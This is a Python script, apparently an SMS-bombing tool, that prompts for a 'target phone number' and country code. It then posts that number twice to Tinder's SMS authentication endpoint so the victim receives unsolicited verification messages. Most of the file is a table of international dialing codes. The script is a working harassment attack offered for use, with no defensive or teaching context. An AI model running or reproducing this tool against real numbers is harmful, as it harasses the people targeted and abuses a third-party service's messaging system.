import requests, random
from colorama import Fore, Style
import json
banner = """{0}
    v           v    o o     x     x
     v         v   o     o    x   x
      v       v   o       o    x x
       v     v    o       o     x
        v   v     o       o    x x
         v v       o     o    x   x
          v          o o     x     x    
            
    github @qappevox
""".format(Fore.LIGHTRED_EX)
def main():
    global banner
    print(banner)
    key = get_key()
    _phone = input('please enter your target phone number without country code. {0}'.format(Fore.CYAN))
    _phone = "+"+ key[0] + _phone
    _name = ''
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale={0}'.format(key[1]), data={'phone_number': _phone}, headers={})
        print(Fore.GREEN + '[+] process sucsesfull!')
    except:
        print(Fore.RED + '[-] Process failed!')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale={0}'.format(key[1]),data={'phone_number': _phone})
        print(Fore.GREEN + '[+] process sucsesfull!')
    except:
        print(Fore.RED + '[-] Process failed!')
    print("{0}".format(Style.RESET_ALL))

def get_key():
    iscodes_dict = {
        "isdcodes": {
            "93":  "AF",
            "355": "AL",
            "213": "DZ",
            "376": "AD",
            "244": "AO",
            "672": "AQ",
            "54":  "AR",
            "374": "AM",
            "297": "AW",
            "61":  "AU",
            "43":  "AT",
            "994": "AZ",
            "973": "BH",
            "880": "BD",
            "375": "BY",
            "32":  "BE",
            "501": "BZ",
            "229": "BJ",
            "975": "BT",
            "591": "BO",
            "387": "BA",
            "267": "BW",
            "55":  "BR",
            "246": "IO",
            "673": "BN",
            "359": "BG",
            "226": "BF",
            "257": "BI",
            "855": "KH",
            "237": "CM",
            "238": "CV",
            "236": "CF",
            "235": "TD",
            "56":  "CL",
            "86":  "CN",
            "57":  "CO",
            "269": "KM",
            "682": "CK",
            "506": "CR",
            "385": "HR",
            "53":  "CU",
            "599": "AN",
            "357": "CY",
            "420": "CZ",
            "243": "CD",
            "45":  "DK",
            "253": "DJ",
            "670": "TL",
            "593": "EC",
            "20":  "EG",
            "503": "SV",
            "240": "GQ",
            "291": "ER",
            "372": "EE",
            "251": "ET",
            "500": "FK",
            "298": "FO",
            "679": "FJ",
            "358": "FI",
            "33":  "FR",
            "689": "PF",
            "241": "GA",
            "220": "GM",
            "995": "GE",
            "49":  "DE",
            "233": "GH",
            "350": "GI",
            "30":  "GR",
            "299": "GL",
            "502": "GT",
            "224": "GN",
            "245": "GW",
            "592": "GY",
            "509": "HT",
            "504": "HN",
            "852": "HK",
            "36":  "HU",
            "354": "IS",
            "91":  "IN",
            "62":  "ID",
            "98":  "IR",
            "964": "IQ",
            "353": "IE",
            "972": "IL",
            "39":  "IT",
            "225": "CI",
            "81":  "JP",
            "962": "JO",
            "254": "KE",
            "686": "KI",
            "383": "XK",
            "965": "KW",
            "996": "KG",
            "856": "LA",
            "371": "LV",
            "961": "LB",
            "266": "LS",
            "231": "LR",
            "218": "LY",
            "423": "LI",
            "370": "LT",
            "352": "LU",
            "853": "MO",
            "389": "MK",
            "261": "MG",
            "265": "MW",
            "60":  "MY",
            "960": "MV",
            "223": "ML",
            "356": "MT",
            "692": "MH",
            "222": "MR",
            "230": "MU",
            "262": "RE",
            "52":  "MX",
            "691": "FM",
            "373": "MD",
            "377": "MC",
            "976": "MN",
            "382": "ME",
            "212": "EH",
            "258": "MZ",
            "95":  "MM",
            "264": "NA",
            "674": "NR",
            "977": "NP",
            "31":  "NL",
            "687": "NC",
            "64":  "NZ",
            "505": "NI",
            "227": "NE",
            "234": "NG",
            "683": "NU",
            "850": "KP",
            "47":  "SJ",
            "968": "OM",
            "92":  "PK",
            "680": "PW",
            "970": "PS",
            "507": "PA",
            "675": "PG",
            "595": "PY",
            "51":  "PE",
            "63":  "PH",
            "48":  "PL",
            "351": "PT",
            "974": "QA",
            "242": "CG",
            "40":  "RO",
            "7":   "RU",
            "250": "RW",
            "590": "MF",
            "290": "SH",
            "508": "PM",
            "685": "WS",
            "378": "SM",
            "239": "ST",
            "966": "SA",
            "221": "SN",
            "381": "RS",
            "248": "SC",
            "232": "SL",
            "65":  "SG",
            "421": "SK",
            "386": "SI",
            "677": "SB",
            "252": "SO",
            "27":  "ZA",
            "82":  "KR",
            "211": "SS",
            "34":  "ES",
            "94":  "LK",
            "249": "SD",
            "597": "SR",
            "268": "SZ",
            "46":  "SE",
            "41":  "CH",
            "963": "SY",
            "886": "TW",
            "992": "TJ",
            "255": "TZ",
            "66":  "TH",
            "228": "TG",
            "690": "TK",
            "676": "TO",
            "216": "TN",
            "90":  "TR",
            "993": "TM",
            "688": "TV",
            "256": "UG",
            "380": "UA",
            "971": "AE",
            "44":  "GB",
            "1":   "US",
            "598": "UY",
            "998": "UZ",
            "678": "VU",
            "379": "VA",
            "58":  "VE",
            "84":  "VN",
            "681": "WF",
            "967": "YE",
            "260": "ZM",
            "263": "ZW"
        }
    }
    return_value = []
    json_obj = json.dumps(iscodes_dict)
    my_dict = json.loads(json_obj)
    key = input("{0}Enter your country code.\n".format(Fore.CYAN))
    value = my_dict["isdcodes"][key]
    return_value.append(key)
    return_value.append(value.lower())
    return return_value

main()
